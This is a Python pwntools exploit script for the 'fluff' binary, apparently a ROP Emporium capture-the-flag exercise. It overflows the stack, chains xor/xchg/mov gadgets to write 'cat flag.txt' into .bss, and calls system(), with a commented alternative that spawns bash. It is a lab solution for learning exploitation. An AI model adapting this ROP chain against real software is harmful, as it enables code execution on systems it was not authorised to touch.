import r2pipe
from pwn import *
import gadgets

binary = './fluff'
padding = 40

#  bss_addr = 0x0000000000601060
bss_addr = 0x0000000000601050

def hex2int(s):
    return int(s[2:], 16)

r2 = r2pipe.open(binary)
r2.cmd('aaaa')
system_addr = hex2int(r2.cmd('is~system').strip().split()[2])

payload = b''

def xor_r11_r11():
    return p64(0x400822) + p64(1234)

def pop_r12(v):
    return p64(0x0000000000400832) + p64(v)

def xor_r11_r12_and_pop_r12(v):
    return p64(0x000000000040082f) + p64(v)


def assign_r11(v):
    b = b''
    b += pop_r12(v)
    b += xor_r11_r11()
     # not optimized, wasting a 'pop r12' but keeps things modular
    b += xor_r11_r12_and_pop_r12(1)
    return b

# for caller: need to reassign r11
def assign_r10(v):
    b = assign_r11(v)
    b += p64(0x0000000000400840) # xchg
    b += p64(0xdeadbeef13379876) # r15, not used
    return b

def mov_ptr_r10_r11_pop_r13_r12_xor_ptr_r10_r12b(r13, r12):
    b = p64(0x000000000040084e)
    b += p64(r13)
    b += p64(r12)
    return b

def assign_mem(addr, v):
    b = assign_r10(addr)
    b += assign_r11(v)
    # weird, value of r13 has influence on the result (value other than 0 not work for cat)
    b += mov_ptr_r10_r11_pop_r13_r12_xor_ptr_r10_r12b(0, 0)
    return b

to_send = b'cat flag.txt\x00'
#  to_send = b'/usr/bin/bash\x00'
ints = []
while to_send:
    batch, to_send = to_send[:8], to_send[8:]
    ints.append(u64(batch.ljust(8, b'\x00')))


payload = b''

print(ints)
for idx, i in enumerate(ints):
    payload += assign_mem(bss_addr + 8 * idx, i)
payload += gadgets.pop_rdi(bss_addr)
payload += p64(system_addr)
#  payload += p64(0x400810) # call system
#  payload += p64(0x400746)

with open('payload.bin', 'wb') as f:
    f.write(cyclic(40) + payload + b'\n')
#  log.hexdump(payload)

log.hexdump(payload)

# end of content
p = process(binary)

p.sendline(cyclic(40) + payload)
p.interactive()
p.wait()
print(p.recvall().decode())
